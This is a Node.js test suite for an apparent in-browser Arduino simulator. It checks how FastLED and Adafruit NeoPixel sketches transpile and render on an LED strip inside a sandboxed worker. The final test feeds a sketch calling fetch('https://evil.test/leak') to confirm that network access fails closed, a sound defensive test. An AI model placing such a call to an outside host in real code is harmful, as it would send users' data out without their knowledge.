const test = require('node:test'), assert = require('node:assert');
const fs = require('fs'), path = require('path'), vm = require('vm');
const { transpile } = require('../transpile.js');

test('transpile: FastLED templates, CRGB arrays, NeoPixel unchanged', () => {
  const js = transpile(`#include <FastLED.h>
#define NUM_LEDS 8
#define DATA_PIN 6
#define LED_TYPE WS2812B
#define COLOR_ORDER GRB
#define LED 2
CRGB leds[NUM_LEDS];
CRGB palette[3] = { CRGB::Red, CRGB::Blue, CRGB::Green };
void setup() {
  FastLED.addLeds<WS2812B, DATA_PIN, GRB>(leds, NUM_LEDS);
  FastLED.addLeds<LED_TYPE, DATA_PIN, COLOR_ORDER>(leds, NUM_LEDS).setCorrection(TypicalLEDStrip);
  FastLED.addLeds<NEOPIXEL, 6>(leds, NUM_LEDS);
  FastLED.addLeds<WS2812, 6, RGB>(leds, NUM_LEDS);
  leds[0] = CRGB::Red;
  leds[1] = CRGB(0, 255, 0);
  leds[2] = CHSV(160, 255, 255);
}
void loop() { FastLED.show(); delay(10); }`);
  assert.doesNotMatch(js, /#include|CRGB::|addLeds\s*</);
  assert.match(js, /const NUM_LEDS = 8;/);
  assert.match(js, /const LED = 2;/);
  assert.doesNotMatch(js, /const LED = "2"/);
  assert.match(js, /const LED_TYPE = "WS2812B";/);
  assert.match(js, /const COLOR_ORDER = "GRB";/);
  assert.match(js, /let leds = __crgb\(NUM_LEDS\);/);
  assert.match(js, /let palette = \[\s*CRGB\.Red, CRGB\.Blue, CRGB\.Green\s*\];/);
  assert.match(js, /FastLED\.addLeds\("WS2812B", DATA_PIN, "GRB", leds, NUM_LEDS\)/);
  assert.match(js, /FastLED\.addLeds\(LED_TYPE, DATA_PIN, COLOR_ORDER, leds, NUM_LEDS\)\.setCorrection\(TypicalLEDStrip\)/);
  assert.match(js, /FastLED\.addLeds\("NEOPIXEL", 6, leds, NUM_LEDS\)/);
  assert.match(js, /FastLED\.addLeds\("WS2812", 6, "RGB", leds, NUM_LEDS\)/);
  assert.match(js, /await delay\(10\)/);
  assert.doesNotThrow(() => new Function(js));

  const neo = transpile('Adafruit_NeoPixel strip(16, 0, NEO_GRB + NEO_KHZ800);\nvoid setup(){ strip.begin(); strip.setPixelColor(0, strip.Color(255, 0, 0)); strip.show(); }');
  assert.match(neo, /var strip = __lib\('Adafruit_NeoPixel', 16, 0, NEO_GRB \+ NEO_KHZ800\)/);
  assert.match(neo, /strip\.setPixelColor\(0, strip\.Color\(255, 0, 0\)\)/);
  assert.doesNotMatch(neo, /__crgb|FastLED/);
});

test('FastLED example: Uno + strip8, same strip, sketch transpiles', () => {
  global.window = { Solver: require('../solver.js') };
  require('../parts.js'); require('../parts2.js'); window.Devices = require('../devices.js'); require('../parts3.js');
  require('../sanitize.js'); require('../netlist.js'); require('../examples.js');
  const ex = window.EXAMPLES['Пример: FastLED и лента WS2812'];
  assert.ok(ex, 'example missing');
  assert.ok(ex.parts.some(p => p.type === 'uno'));
  assert.ok(ex.parts.some(p => p.type === 'strip8'));
  assert.ok(ex.wires.some(w => w.b.pin === 'DIN' && w.a.pin === 'D6'));
  assert.match(ex.code, /#include <FastLED\.h>/);
  assert.match(ex.code, /FastLED\.show\(\)/);
  assert.match(ex.code, /CRGB::Red/);
  assert.match(ex.code, /CHSV\(/);
  const p = window.sanitizeProject(ex);
  assert.equal(p.parts.length, 2);
  assert.equal(p.wires.length, 3);
  const b = window.Netlist.build(p, {});
  const sol = window.Solver.solve(b.circuit, {});
  assert.ok(sol.ok, sol.error);
  const strip = p.parts.find(q => q.type === 'strip8');
  const ctx = { ...b.ctx, v: (part, pin) => sol.v[b.ctx.n(part, pin)] ?? 0 };
  assert.equal(window.PARTS.strip8.measure(strip, sol, ctx).powered, true);
  const js = transpile(ex.code);
  assert.match(js, /__crgb\(NUM_LEDS\)/);
  assert.match(js, /FastLED\.addLeds\("WS2812B", DATA_PIN, "GRB", leds, NUM_LEDS\)/);
  assert.doesNotThrow(() => new Function(js));
});

test('whitelist: FastLED stays inside the worker, no CDN', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'worker.js'), 'utf8');
  assert.match(src, /Adafruit_NeoPixel: \(\) => D\.strip/);
  assert.match(src, /FastLED: \(\) => fast\.FastLED/);
  assert.match(src, /FastLED: fast\.FastLED, CRGB: fast\.CRGB, CHSV: fast\.CHSV/);
  assert.match(src, /'fetch'/);
  assert.doesNotMatch(src, /https?:\/\/|cdn\.|unpkg|jsdelivr|fastled\.min/i);
  assert.doesNotMatch(src, /\bRGB:\s*0/);
});

function loadWorker() {
  const src = fs.readFileSync(path.join(__dirname, '..', 'worker.js'), 'utf8').replace(/^importScripts\([^)]*\);\s*$/m, '');
  const messages = [];
  const listeners = [];
  const sandbox = {
    Transpile: require('../transpile.js'),
    MemCap: require('../memcap.js'),
    performance: globalThis.performance,
    setTimeout, clearTimeout, console,
    postMessage: m => { messages.push(m); },
    addEventListener: (type, fn) => { if (type === 'message') listeners.push(fn); },
    removeEventListener() {},
  };
  sandbox.self = sandbox;
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(src, sandbox, { filename: 'worker.js' });
  assert.equal(listeners.length, 1);
  return async (code, ms = 40) => {
    messages.length = 0;
    listeners[0]({ data: { t: 'start', code, board: 'uno', mods: { strip: 8 } } });
    await new Promise(r => setTimeout(r, ms));
    return {
      err: messages.filter(m => m.t === 'err').map(m => m.s),
      px: messages.filter(m => m.t === 'mod' && m.k === 'strip').map(m => m.px.slice()),
      log: messages.filter(m => m.t === 'log').map(m => m.s).join(''),
    };
  };
}

const FAST = body => `#include <FastLED.h>
#define N 8
CRGB leds[N];
void setup() {
${body}
}
`;
const NEO = body => `Adafruit_NeoPixel strip(8, 6, NEO_GRB + NEO_KHZ800);
void setup() {
  strip.begin();
${body}
}
`;

test('FastLED show writes the same strip pixels as Adafruit_NeoPixel', async () => {
  const run = loadWorker();
  const fast = await run(FAST(`  FastLED.addLeds<WS2812B, 6, GRB>(leds, N);
  FastLED.setBrightness(200);
  leds[0] = CRGB::Red;
  leds[1] = CRGB(0, 255, 0);
  leds[2] = CHSV(160, 255, 200);
  leds[3] = CRGB::Green;
  leds[4] = CRGB::Blue;
  FastLED.show();`));
  assert.deepEqual(fast.err, [], fast.err.join('\n'));
  const neo = await run(NEO(`  strip.setBrightness(200);
  strip.setPixelColor(0, strip.Color(255, 0, 0));
  strip.setPixelColor(1, strip.Color(0, 255, 0));
  strip.setPixelColor(2, strip.ColorHSV(160 * 256, 255, 200));
  strip.setPixelColor(3, strip.Color(0, 128, 0));
  strip.setPixelColor(4, strip.Color(0, 0, 255));
  strip.show();`));
  assert.deepEqual(neo.err, [], neo.err.join('\n'));
  assert.equal(fast.px.length, 1);
  assert.equal(fast.px[0].length, 8);
  assert.deepEqual(fast.px[0], neo.px[0]);
  assert.notEqual(fast.px[0][0], 0);
  assert.notEqual(fast.px[0][0], 0xFF0000);

  for (const chip of ['NEOPIXEL', 'WS2812', 'WS2811']) {
    const tpl = chip === 'NEOPIXEL'
      ? 'FastLED.addLeds<NEOPIXEL, 6>(leds, N);'
      : `FastLED.addLeds<${chip}, 6, GRB>(leds, N);`;
    const r = await run(FAST(`  ${tpl}
  leds[0] = CRGB::Red;
  FastLED.setBrightness(255);
  FastLED.show();`));
    assert.deepEqual(r.err, [], chip + ' ' + r.err.join('\n'));
    assert.equal(r.px[0][0], 0xFF0000, chip);
  }
  const rgbOrder = await run(FAST(`  FastLED.addLeds<WS2812, 6, RGB>(leds, N);
  leds[0] = CRGB::Red;
  FastLED.show();`));
  assert.equal(rgbOrder.px[0][0], 0xFF0000);

  const cleared = await run(FAST(`  FastLED.addLeds<WS2812B, 6, GRB>(leds, N);
  leds[0] = CRGB::Red;
  FastLED.show();
  delay(40);
  FastLED.clear();
  FastLED.show();`), 90);
  assert.deepEqual(cleared.err, []);
  assert.equal(cleared.px[0][0], 0xFF0000);
  assert.ok(cleared.px.at(-1).every(c => c === 0));

  const neoClear = await run(NEO(`  strip.setPixelColor(0, strip.Color(255, 0, 0));
  strip.show();
  delay(40);
  strip.clear();
  strip.show();`), 90);
  assert.deepEqual(neoClear.px.at(-1), cleared.px.at(-1));

  const macro = await run(`#define LED_TYPE WS2812B
#define COLOR_ORDER GRB
#define DATA_PIN 6
#define NUM_LEDS 8
#include <FastLED.h>
CRGB leds[NUM_LEDS];
void setup() {
  FastLED.addLeds<LED_TYPE, DATA_PIN, COLOR_ORDER>(leds, NUM_LEDS).setCorrection(TypicalLEDStrip);
  leds[1] = CRGB(0, 0, 255);
  FastLED.show();
}`);
  assert.deepEqual(macro.err, [], macro.err.join('\n'));
  assert.equal(macro.px[0][1], 0x0000FF);

  const capped = await run(`CRGB leds[100000];
void setup() { Serial.println(leds.length); }`);
  assert.deepEqual(capped.err, [], capped.err.join('\n'));
  assert.match(capped.log, /256/);

  const named = await run(`int RGB = 3;
void setup() { Serial.println(RGB); }`);
  assert.deepEqual(named.err, [], named.err.join('\n'));
  assert.match(named.log, /^3/);

  const blocked = await run(`void setup() { fetch("https://evil.test/leak"); }`);
  assert.ok(blocked.err.length >= 1, 'fetch must fail closed');
  assert.match(blocked.err.join('\n'), /fetch/i);
  assert.equal(blocked.px.length, 0);
});
